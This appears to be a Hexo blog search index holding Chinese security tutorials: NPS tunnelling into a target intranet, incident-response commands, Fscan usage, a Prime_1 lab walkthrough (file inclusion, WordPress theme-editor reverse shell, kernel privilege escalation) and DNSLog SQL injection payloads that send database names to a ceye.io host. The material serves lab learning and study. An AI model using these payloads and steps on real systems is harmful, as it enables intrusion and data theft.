<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记录一下NPS隧道如何搭建</title>
      <link href="/2023/11/23/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8BNPS%E9%9A%A7%E9%81%93%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/11/23/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8BNPS%E9%9A%A7%E9%81%93%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>本文记录一次利用NPS，访问目标内网机器的过程</p><span id="more"></span><h3 id="什么是NPS"><a href="#什么是NPS" class="headerlink" title="什么是NPS"></a>什么是NPS</h3><p>NPS是一款内网穿透工具 特点是轻量级、高性能。目前支持TCP、UDP流量转发，可支持任何TCP、UDP上层协议(二如访问内网网站、本地支付接口调试、ssh访问、远程桌面、内网DNS解析等等)，此外还支持内网HTTP代理、内网SOCK5代理、P2P等，并且带有强大的web管理端。<br>附上开源地址 Github：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><h3 id="我的目标"><a href="#我的目标" class="headerlink" title="我的目标"></a>我的目标</h3><p>我现在有一台主机A，一台VPS B，B可以和一台处于内网环境的主机通信，目标是去访问这台内网主机上开放的一个告警平台，但是由于VPS只可以命令行操作，没有GUI界面，所以需要利用NPS做一次内网穿透，最后在A上通过代理软件Proxifer 将VPS访问内网主机的流量转发出来，然后我们就可以在A上看到内网主机上的告警平台了。</p><h3 id="NPS的搭建过程"><a href="#NPS的搭建过程" class="headerlink" title="NPS的搭建过程"></a>NPS的搭建过程</h3><p>1.VPS上搭建NPS服务端<br>先下载对应自己VPS的NPS服务端版本(我的是Ubuntu)<br><br>解压命令 tar -xvzf linux_amd64_server.tar.gz<br><br>解压之后当前目录会多出三个文件NPS、web、conf<br><br>安装NPS命令 .&#x2F;nps install<br><br>查看配置文件 &#x2F;etc&#x2F;nps&#x2F;conf&#x2F;nps.conf<br><br>一般需要修改的地方如下<br><br>bridge_port&#x3D;8024      #NPS的服务端和客户端进行连接的默认端口<br><br>web_username&#x3D;admin    #web界面管理账号<br><br>web_password&#x3D;123      #web界面管理密码<br><br>web_port &#x3D; 8080       #web管理端口，通过访问该端口可以访问NPS后台<br><br>启动&#x2F;停止NPS命令 nps start&#x2F;stop<br><br>注意，如果服务开启不了，可能是没有开启端口<br><br>Ubuntu开启某端口命令 sudo ufw allow 端口号<br><br>或者直接关闭防火墙 sudo ufw disable<br><br>访问管理页面 <a href="http://ip:8080/">http://IP:8080</a><br><br>点击客户端，选择新增客户端，可以默认不填写直接新增<br><br>点击隧道进入，模式选择SOCKS5代理，端口可以设置一个空闲的端口(VPS的)，这个端口就是后面攻击机去连接的端口<br><br><br><br>2.客户端(NPS)配置<br>需要对客户端NPC解压命令 tar xzvf linux_amd_64_server.tar.gz<br><br>然后运行在服务端生成的命令 sudo .&#x2F;npc install -server&#x3D;IP:8024 -vkey&#x3D;xxxx -type&#x3D;tcp -log_level&#x3D;0<br><br>最后启动NPC命令 sudo .&#x2F;npc start<br></p><p>这样就搭建好了隧道，下面需要用代理软件Proxifer来进行连接</p><h3 id="Proxifer连接"><a href="#Proxifer连接" class="headerlink" title="Proxifer连接"></a>Proxifer连接</h3><p>VPS和目标已经搭建好了隧道，现在就是需要在自己的主机上面利用Proxifer来进行连接<br><br>启动Proxifer<br><br>菜单栏点击Proxy Servers图标—add，这里添加socks代理，填写socks服务端的IP和端口<br><br>单击Proxification Rules图标—add，这里设置如果访问192.168.10.*这个IP段则走socks5代理<br><br>勾选我们添加的代理规则，默认的代理规勾选为Direct！！！记得<br><br>最后就可以访问了</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/qq_44159028/article/details/122719330">https://blog.csdn.net/qq_44159028/article/details/122719330</a><br><a href="https://blog.csdn.net/Eng_ingLi/article/details/131611171">https://blog.csdn.net/Eng_ingLi/article/details/131611171</a><br>如果侵权，请联系本人(<a href="mailto:&#x72;&#x65;&#119;&#101;&#x62;&#101;&#x72;&#64;&#49;&#54;&#x33;&#x2e;&#99;&#111;&#x6d;">&#x72;&#x65;&#119;&#101;&#x62;&#101;&#x72;&#64;&#49;&#54;&#x33;&#x2e;&#99;&#111;&#x6d;</a>)删除</p>]]></content>
      
      
      
        <tags>
            
            <tag> 隧道技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于病毒被杀软查杀但态势还是会告警</title>
      <link href="/2023/10/18/%E5%85%B3%E4%BA%8E%E7%97%85%E6%AF%92%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%9F%A5%E6%9D%80%E4%BD%86%E6%80%81%E5%8A%BF%E8%BF%98%E6%98%AF%E4%BC%9A%E5%91%8A%E8%AD%A6/"/>
      <url>/2023/10/18/%E5%85%B3%E4%BA%8E%E7%97%85%E6%AF%92%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%9F%A5%E6%9D%80%E4%BD%86%E6%80%81%E5%8A%BF%E8%BF%98%E6%98%AF%E4%BC%9A%E5%91%8A%E8%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>本文用简短的几句话来描述在杀软实时监测下的主机触发木马病毒被态势感知告警的问题</p><span id="more"></span><h3 id="问题的起因"><a href="#问题的起因" class="headerlink" title="问题的起因"></a>问题的起因</h3><p>在向领导汇报的时候，领导突然问了一句，杀软是实时监测主机的，如果有木马病毒触发告警，应该第一时间被杀掉了呀，既然被查杀掉了，为什么态势感知这边还是会告警呢？由于我就是个菜鸡，一下子就被问住了，正当气氛即将要尴尬起来的时候，我旁边的老师傅开始解释了起来…</p><h3 id="为什么态势感知还是会触发告警"><a href="#为什么态势感知还是会触发告警" class="headerlink" title="为什么态势感知还是会触发告警"></a>为什么态势感知还是会触发告警</h3><p>老师傅对领导说，杀软实时监测的是主机上正在运行的程序，并非该主机上的所有文件。当杀软在对主机上面做全盘查杀的时候，才会对主机上的所有文件进行扫描。当一个木马病毒运行起来的时候，并且做出了一些可疑的动作，比如去外联一个地址，做出这些动作的时候，杀软监测到了，马上对该木马病毒进行查杀，同时这个时候，外联地址这个动作也会产生对应的流量，当流量走向态势感知的时候，态势分析出了该流量存在恶意IP、域名，或者恶意动作，即就触发了告警。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 常见问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下一些常用的应急响应命令</title>
      <link href="/2023/10/05/Linux%E4%B8%8B%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/10/05/Linux%E4%B8%8B%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>本文记录几个常用的Linux的应急响应命令</p><span id="more"></span><h3 id="最近2分钟修改过的文件"><a href="#最近2分钟修改过的文件" class="headerlink" title="最近2分钟修改过的文件"></a>最近2分钟修改过的文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -mmin -2</span><br></pre></td></tr></table></figure><h3 id="最近2分钟修改过的文件并匹配关注的文件"><a href="#最近2分钟修改过的文件并匹配关注的文件" class="headerlink" title="最近2分钟修改过的文件并匹配关注的文件"></a>最近2分钟修改过的文件并匹配关注的文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -mmin -2 | grep 关键字</span><br></pre></td></tr></table></figure><h3 id="查看文件的修改时间"><a href="#查看文件的修改时间" class="headerlink" title="查看文件的修改时间"></a>查看文件的修改时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls --full-time 文件名</span><br></pre></td></tr></table></figure><h3 id="Linux下查看文件的哈希值"><a href="#Linux下查看文件的哈希值" class="headerlink" title="Linux下查看文件的哈希值"></a>Linux下查看文件的哈希值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5sum 文件名</span><br></pre></td></tr></table></figure><h3 id="windows下查看文件的哈希值"><a href="#windows下查看文件的哈希值" class="headerlink" title="windows下查看文件的哈希值"></a>windows下查看文件的哈希值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -hashfile 文件名</span><br></pre></td></tr></table></figure><h3 id="对一个文件的日志进行统计"><a href="#对一个文件的日志进行统计" class="headerlink" title="对一个文件的日志进行统计"></a>对一个文件的日志进行统计</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 文件名 | grep 关键字 | wc -l</span><br></pre></td></tr></table></figure><h3 id="查看正在监听的端口"><a href="#查看正在监听的端口" class="headerlink" title="查看正在监听的端口"></a>查看正在监听的端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntplu</span><br></pre></td></tr></table></figure><h3 id="查看开机启动的服务"><a href="#查看开机启动的服务" class="headerlink" title="查看开机启动的服务"></a>查看开机启动的服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure><h3 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>扫描神器-Fscan</title>
      <link href="/2023/10/04/%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8-Fscan/"/>
      <url>/2023/10/04/%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8-Fscan/</url>
      
        <content type="html"><![CDATA[<p>平时对Fscan的用法就只有Fscan -h ip，在一次实战中，由于对Fscan的用法不够熟悉，导致效率大大降低，今天梳理一下Fscan的几个详细用法。</p><span id="more"></span><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="h"><a href="#h" class="headerlink" title="-h"></a>-h</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-h 指定扫描的目标IP</span><br></pre></td></tr></table></figure><h3 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p 1-65535 指定扫描的端口</span><br></pre></td></tr></table></figure><h3 id="nobr"><a href="#nobr" class="headerlink" title="-nobr"></a>-nobr</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-nobr 指扫描时跳过sql、ftp、ssh等爆破</span><br></pre></td></tr></table></figure><h3 id="np"><a href="#np" class="headerlink" title="-np"></a>-np</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-np 指扫描时跳过存活检测</span><br></pre></td></tr></table></figure><h3 id="nopoc"><a href="#nopoc" class="headerlink" title="-nopoc"></a>-nopoc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-nopoc 指扫描时跳过web poc扫描</span><br></pre></td></tr></table></figure><h3 id="proxy"><a href="#proxy" class="headerlink" title="-proxy"></a>-proxy</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-proxy http://127.0.0.1:9999 指扫描时可以设置代理，可以和bp一起联动使用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Fscan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场实战1-prime1</title>
      <link href="/2023/01/01/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%981-prime1/"/>
      <url>/2023/01/01/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%981-prime1/</url>
      
        <content type="html"><![CDATA[<h3 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h3><p><img src="https://www.z4a.net/images/2024/01/03/15b64f7d07f5a6c00.png" alt="15b64f7d07f5a6c00.png"></p><h3 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h3><p>Prime_1</p><p>目标，获取靶机root权限</p><p>开启之后，得到用户名victor，但是不知道密码(是需要我们自己提取权限)<br><img src="https://www.z4a.net/images/2024/01/03/24933d86a23c3fe00.png" alt="24933d86a23c3fe00.png"></p><p>可以看到一个提示，find password.txt file in my directory</p><p>####1.主机发现和端口扫描</p><p>可以知道这台主机的网段<br><img src="https://www.z4a.net/images/2024/01/03/38db5bdb4d0bbcf65.png" alt="38db5bdb4d0bbcf65.png"></p><p>C段地址</p><p>192.168.200.0&#x2F;24 (子网掩码24表示最后8位是不确定的)</p><p>Namp -sP 192.168.200.1&#x2F;24(用Ping的方式进行扫描)</p><p><img src="https://www.z4a.net/images/2024/01/03/484800bc677abeb31.png" alt="484800bc677abeb31.png"></p><p>由此可以确定目标为192.168.200.129</p><p>也可以看看MAC地址，发现完全吻合<br><img src="https://www.z4a.net/images/2024/01/03/55e1fe265dbc431b2.png" alt="55e1fe265dbc431b2.png"></p><p>也可以用 arp-scan -l<br><img src="https://www.z4a.net/images/2024/01/03/61c7a882811922846.png" alt="61c7a882811922846.png"></p><p>或者 netdiscover -I eth0 -r 192.168.200.1&#x2F;24<br><img src="https://www.z4a.net/images/2024/01/03/7966d8b5a9599e0b5.png" alt="7966d8b5a9599e0b5.png"></p><p>再进行端口扫描，确定其运行的程序</p><p>Nmap -p 1-65535 -A 192.168.200.129，发现22和80端口<br><img src="https://www.z4a.net/images/2024/01/03/82899f6f64f126fd9.png" alt="82899f6f64f126fd9.png"></p><p>先从80端口开始</p><p>访问一下<br><img src="https://www.z4a.net/images/2024/01/03/93ae7f66e1b48af8f.png" alt="93ae7f66e1b48af8f.png"></p><p>就一张图片<br>需要目录扫描<br><img src="https://www.z4a.net/images/2024/01/03/109bcf8fa5a097ac79.png" alt="109bcf8fa5a097ac79.png"></p><p>看看，看来需要进一步挖掘<br><img src="https://www.z4a.net/images/2024/01/03/11679b6c81115f9b2d.png" alt="11679b6c81115f9b2d.png"></p><p>则进行更加具体的目录扫描，加了扩展名<br><img src="https://www.z4a.net/images/2024/01/03/12ddebe5d0c5464464.png" alt="12ddebe5d0c5464464.png"></p><p><img src="https://www.z4a.net/images/2024/01/03/133bb1844ed91c04c3.png" alt="133bb1844ed91c04c3.png"><br>FUZZ指<a href="http://192.168.200.129/index.php%E7%9A%84%E5%90%8E%E9%9D%A2%E6%88%96%E8%AE%B8%E8%BF%98%E6%9C%89%E5%8F%82%E6%95%B0%E6%AF%94%E5%A6%82?parm=%E2%80%A6">http://192.168.200.129/index.php的后面或许还有参数比如?parm=…</a></p><p>可以用来找参数、目录扫描、密码暴力破解、找出被过滤的关键字、压力测试<br><img src="https://www.z4a.net/images/2024/01/03/144dd0959becc3862a.png" alt="144dd0959becc3862a.png"><br><img src="https://www.z4a.net/images/2024/01/03/15b8368caffefd85de.png" alt="15b8368caffefd85de.png"><br>7L是HTTP响应内容的行数</p><p>12W是有多有个词，包括空格</p><p>136Ch指有多少字符</p><p>那么需要过滤一些参数，可以得到不同的结果，可能就是需要找的内容</p><p><img src="https://www.z4a.net/images/2024/01/03/16e0018128ea0263b9.png" alt="16e0018128ea0263b9.png"><br><img src="https://www.z4a.net/images/2024/01/03/1712427d3f2a0a52e0.png" alt="1712427d3f2a0a52e0.png"></p><p>得到一个file参数，提示文件名不对<br><img src="https://www.z4a.net/images/2024/01/03/1865273df827f853bb.png" alt="1865273df827f853bb.png"></p><p>想起了本地文件包含漏洞</p><p>如果想得到正确的文件名，可以继续FUZZ</p><p>但是也有前面的提示<br><img src="https://www.z4a.net/images/2024/01/03/193ca36372f1b5949d.png" alt="193ca36372f1b5949d.png"></p><p><img src="https://www.z4a.net/images/2024/01/03/20e0bca415d291c63f.png" alt="20e0bca415d291c63f.png"></p><p>用 secrettier360 这个参数，在别的php文件里面FUZZ下<br><img src="https://www.z4a.net/images/2024/01/03/2129f6cbb185ab0cb0.png" alt="2129f6cbb185ab0cb0.png"></p><p>但是，文件名是啥呢？</p><p>这是一个Ubantu的操作系统，它常见的敏感文件有哪些呢？</p><p>&#x2F;etc&#x2F;password<br><img src="https://www.z4a.net/images/2024/01/03/2246a388c0203a861d.png" alt="2246a388c0203a861d.png"></p><p>有点乱，在kali里面看看<br><img src="https://www.z4a.net/images/2024/01/03/2362214061a8426820.png" alt="2362214061a8426820.png"></p><p>但是密码都是x，真正的密码，在&#x2F;ect&#x2F;shadow里面的，这里，&#x2F;etc&#x2F;shadow是不能访问的</p><p>这个时候，仔细看<br><img src="https://www.z4a.net/images/2024/01/03/24.png" alt="24.png"><br>这不是这个提示吗？<br><img src="https://www.z4a.net/images/2024/01/03/25.png" alt="25.png"><br><img src="https://www.z4a.net/images/2024/01/03/26.png" alt="26.png"></p><p>得到字符串 follow_the_ippsec</p><p>但，这个密码是在web里面找到的，是什么的密码呢？</p><p>不是系统的登录密码，排除SSH<br><img src="https://www.z4a.net/images/2024/01/03/27.png" alt="27.png"><br>刚才不是扫出来了一个 Wordpress吗？<br>找到登录框，进行登录<br><img src="https://www.z4a.net/images/2024/01/03/28.png" alt="28.png"><br>问题又来了，现在知道密码，那用户名是啥呢？<br><img src="https://www.z4a.net/images/2024/01/03/29.png" alt="29.png"><br><img src="https://www.z4a.net/images/2024/01/03/30.png" alt="30.png"><br>可以用工具cmseek，是一个指纹识别工具，附带用户枚举的功能</p><p>但是，这里没有出现<br><img src="https://www.z4a.net/images/2024/01/03/31.png" alt="31.png"><br>用wpscan<br><img src="https://www.z4a.net/images/2024/01/03/32.png" alt="32.png"><br><img src="https://www.z4a.net/images/2024/01/03/33.png" alt="33.png"></p><p>找到用户victor</p><p>那就得到wordpree的用户名 victor 密码 follow_the_ippsec</p><p>进入wordpress管理系统<br><img src="https://www.z4a.net/images/2024/01/03/34.png" alt="34.png"><br>找到主题编辑器<br><img src="https://www.z4a.net/images/2024/01/03/35.png" alt="35.png"><br>找到一个可以写入并且保存的地方</p><h3 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h3><p>这里可以写一句话木马，也可以建立反弹连接</p><p>kali开启msf</p><p>更新msf</p><p>先 apt-get update</p><p>再 apt-get install metaspolit-framework</p><p>先用msfvenom生成反弹连接的php代码<br><img src="https://www.z4a.net/images/2024/01/03/37.png" alt="37.png"><br>然后把里面的代码，复制，并且保存<br><img src="https://www.z4a.net/images/2024/01/03/38.png" alt="38.png"><br>然后在kali机上监听端口<br><img src="https://www.z4a.net/images/2024/01/03/39.png" alt="39.png"><br>然后我们需要访问这个地址<br><img src="https://www.z4a.net/images/2024/01/03/40.png" alt="40.png"><br>地址 ​​<a href="http://192.168.200.129/wordpress/wp-content/themes/twentynineteen/secret.php%E2%80%8B">http://192.168.200.129/wordpress/wp-content/themes/twentynineteen/secret.php​</a><br><img src="https://www.z4a.net/images/2024/01/03/41.png" alt="41.png"><br>连接成功<br><img src="https://www.z4a.net/images/2024/01/03/42.png" alt="42.png"><br>下面就是如何提权，然后得到root用户的权限</p><p>看看这个操作系统本身有没有漏洞，可以在msf上可以实现<br><img src="https://www.z4a.net/images/2024/01/03/43.png" alt="43.png"><br>用这个漏洞，可以直接成为root用户，并且也有一个现成的C语言脚本可以利用</p><p>这个文件在 &#x2F;linux&#x2F;local&#x2F;45010.c</p><p>即 &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local</p><p>拷贝到&#x2F;home&#x2F;kali目录下<br><img src="https://www.z4a.net/images/2024/01/03/44.png" alt="44.png"><br>编译<br><img src="https://www.z4a.net/images/2024/01/03/45.png" alt="45.png"><br>然后利用meterpreter 的 upload命令，把攻击机的文件传到靶机上面去，选择tmp目录是因为，任何用户都有它的权限<br><img src="https://www.z4a.net/images/2024/01/03/46.png" alt="46.png"><br><img src="https://www.z4a.net/images/2024/01/03/47.png" alt="47.png"><br>但是需要给45010执行的权限</p><p>利用shell，进入shell程序<br><img src="https://www.z4a.net/images/2024/01/03/48.png" alt="48.png"><br>最后执行<br><img src="https://www.z4a.net/images/2024/01/03/49.png" alt="49.png"><br>执行脚本的时候，出现了问题</p><p>那就自己安装一个低版本的kali，编译这个文件再试试(kali-2021.4)</p><p>那么就在这台kali上继续复现了</p><p>然后又失败了，我又安装了，kali-2019，还是失败</p><p>这个时候，需要回去想想是不是，prime1机器的问题了</p><p>我回去看了一下，果然是，内核版本，变了，原因不知道为啥<br><img src="https://www.z4a.net/images/2024/01/03/50.png" alt="50.png"><br>需要重新安装一次 prime<br><img src="https://www.z4a.net/images/2024/01/03/51.png" alt="51.png"><br>现在可以了，用kali 2019 编译的，放在kali 2022上面运行，成功提权<br><img src="https://www.z4a.net/images/2024/01/03/52.png" alt="52.png"><br>进入root，看看关键文件信息<br><img src="https://www.z4a.net/images/2024/01/03/53.png" alt="53.png"><br>有时候，出了问题，不知道错在哪里的时候，一定要回头看看!!!</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之DNSLog注入</title>
      <link href="/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="一-什么是DNSLog"><a href="#一-什么是DNSLog" class="headerlink" title="一.什么是DNSLog"></a>一.什么是DNSLog</h3><p>DNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器<br><br>下图就是注册之后的，首先需要得到这个Identifier<br><img src="https://s2.loli.net/2024/01/02/naKmI3WFfE4qeO2.png" alt="1.png"><br>然后我在本机上ping一下这个Identifier<br><img src="https://s2.loli.net/2024/01/03/g61ElvHIiOspSDe.png" alt="2.png"><br>然后在ceye平台上就会有一个对应的记录<br><img src="https://s2.loli.net/2024/01/03/lCdmPc4N8jt1euJ.png" alt="3.png"></p><h3 id="二-如何利用DNSLog"><a href="#二-如何利用DNSLog" class="headerlink" title="二.如何利用DNSLog"></a>二.如何利用DNSLog</h3><p>在ping 这个地址的时候，是可以变为多级的，比如一开始是 ping xxx.ceye.io ，但是我可以这样<br>ping %username%.xxx.ceye.io<br><img src="https://s2.loli.net/2024/01/03/UkmNL3abqFQCtDO.png" alt="4.png"><br>这样，平台产生的记录，就会得到你当前计算机的用户名(我这里遮掉了)<br><img src="https://s2.loli.net/2024/01/03/NylXuZRBcEUI5DW.png" alt="5.png"><br>那么，同样的道理，我如果这里放一个sql语句，是不是也会执行呢?<br>再补充一个内容，叫UNC，它是windows上面共享资源地址的格式，比如你分享一个文件出去，然后就会产生一个访问这个文件的地址，这个就是UNC的路径，可以理解为UNC就是访问共享资源地址的格式<br>那这个DNSLog和数据库(这里以MYSQL为列)会有什么关联呢？<br>MYSQL里面有一个文件读写的函数，LOAD_FILE(文件路径)</p><p>如何利用这个函数呢？<br>1.需要在mysql的my.ini文件里面配置参数 secure_file_priv<br>在[mysqld]下面配置，配置完了之后需要重启mysql，管理员身份执行 net stop mysql 再net start mysql<br><img src="https://s2.loli.net/2024/01/03/v9bklY5KjyrV6xF.png" alt="6.png"><br>然后再查询看看是否真的打开了 命令 show variables like ‘%secure_file_priv%’，如下图，是打开了的<br><img src="https://s2.loli.net/2024/01/03/aZwAlMUnRhWHOB3.png" alt="7.png"></p><p>2.有了读写权限之后，这个读写函数，只能读取本机的文件，并且读取的字节数要小于max_allowed_packet</p><p>查询max_allowed_packet<br><img src="https://s2.loli.net/2024/01/03/piSAv8sBdDKrjYT.png" alt="8.png"><br>现在读取一个文件试试，路径是D:\d1.txt 命令为 select LOAD_FILE(‘D:\d1.txt’)</p><p>读取出来的内容为16进制之后的<br><img src="https://s2.loli.net/2024/01/03/kJcCTfru5ADZmLz.png" alt="9.png"><br>然后还可以写入一个文件到本地文件，命令 select 123 into outfile ‘E:\out.txt’<br><img src="https://s2.loli.net/2024/01/03/saCopg1xBJjNqEM.png" alt="10.png"><br>那如果我把一个DNS服务器的地址放入，然后再访问这个地址，不就是可以在DNSLog上面看到这个数据库的信息了吗？</p><h3 id="三-DNSLog注入"><a href="#三-DNSLog注入" class="headerlink" title="三.DNSLog注入"></a>三.DNSLog注入</h3><p>先构建这个地址，然后访问</p><p>比如 select load_file(‘&#x2F;&#x2F;&#x2F;&#x2F;aaa.xxx.ceye.io&#x2F;dzh’)，注意，这里的&#x2F;dzh可以是任何内容，比如&#x2F;zxc，但是必须要有</p><p>然后就是，不要在navicat后面执行上面的语句，可能会是如下情况<br><img src="https://www.freeimg.cn/i/2024/01/03/659436ed06731.png" alt="11.png"><br>需要在命令行执行<br><img src="https://www.freeimg.cn/i/2024/01/03/6594370971aad.png" alt="12.png"><br>那么这个aaa，是可以替换为sql语句的，比如我进入一个叫crm的数据库</p><p>并且执行命令 select if((select load_file(concat(‘\\‘,database(),’.xxx.ceye.io\dzh’))),1,0);<br><img src="https://www.freeimg.cn/i/2024/01/03/6594370982e66.png" alt="13.png"><br><img src="https://www.freeimg.cn/i/2024/01/03/659437099276e.png" alt="14.png"><br>最后我们再以sqli-labs靶场的第五关为列子</p><p>在地址后面加上 ‘and if((select load_file(concat(‘\\‘,databse().’xxx.ceye.io\dzh’)))1,0)–+<br><img src="https://www.freeimg.cn/i/2024/01/03/65943709c874f.png" alt="15.png"><br>然后可以在后台看到sqli-labs的数据库<br><img src="https://www.freeimg.cn/i/2024/01/03/6594370976374.png" alt="16.png"><br>后面的步骤就是替换sql语句，来进行其他的注入操作了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于VMware的将主机虚拟适配器连接到次网络无法选中的问题</title>
      <link href="/2022/11/28/%E5%85%B3%E4%BA%8EVMware%E7%9A%84%E5%B0%86%E4%B8%BB%E6%9C%BA%E8%99%9A%E6%8B%9F%E9%80%82%E9%85%8D%E5%99%A8%E8%BF%9E%E6%8E%A5%E5%88%B0%E6%AC%A1%E7%BD%91%E7%BB%9C%E6%97%A0%E6%B3%95%E9%80%89%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/11/28/%E5%85%B3%E4%BA%8EVMware%E7%9A%84%E5%B0%86%E4%B8%BB%E6%9C%BA%E8%99%9A%E6%8B%9F%E9%80%82%E9%85%8D%E5%99%A8%E8%BF%9E%E6%8E%A5%E5%88%B0%E6%AC%A1%E7%BD%91%E7%BB%9C%E6%97%A0%E6%B3%95%E9%80%89%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>这个问题的原因可能是，你之前卸载VMware的时候，没有卸载完全，所以注册表还存在一些相关的垃圾</p><p>这里需要用到CCleaner<br><img src="https://www.z4a.net/images/2024/01/03/1cdfce19f30d0bc77.png" alt="1cdfce19f30d0bc77.png"></p><p>然后就可以勾上了<br><img src="https://www.z4a.net/images/2024/01/03/20c0a3ab4799f6fd1.png" alt="20c0a3ab4799f6fd1.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 常见问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike注入MSF会话</title>
      <link href="/2022/11/27/CobaltStrike%E6%B3%A8%E5%85%A5MSF%E4%BC%9A%E8%AF%9D/"/>
      <url>/2022/11/27/CobaltStrike%E6%B3%A8%E5%85%A5MSF%E4%BC%9A%E8%AF%9D/</url>
      
